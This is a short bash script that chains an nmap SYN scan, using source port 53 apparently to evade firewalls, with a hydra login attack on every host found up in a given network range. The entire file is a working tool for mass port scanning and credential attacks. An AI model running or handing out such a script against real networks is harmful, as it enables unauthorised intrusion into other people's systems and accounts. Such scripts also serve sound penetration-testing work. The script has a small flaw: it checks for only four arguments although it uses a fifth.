#!/bin/bash

echo -e "\Hydra Nmap Brute Force"
echo "Written by tyto"

if [ -z "$4" ]; then
    echo "Example: $0 <user> <password> <port> <cidr_network_address> <service>"
else
    echo ""
    nmap --open -sS -g 53 -p $3 -Pn $4 -oG nmap_out
    if ! [[ ! -s "nmap_out" || -z "$(grep -o '[^[:space:]]' "nmap_out")" ]]; then
        cat nmap_out | grep "Up" | cut -d " " -f 2 > hosts
	echo ""
	if [[ -s hosts ]]; then
		hydra -s $3 -l $1 -p $2 -M hosts $5
		rm hosts
	fi
    	rm nmap_out
    fi
    echo ""
fi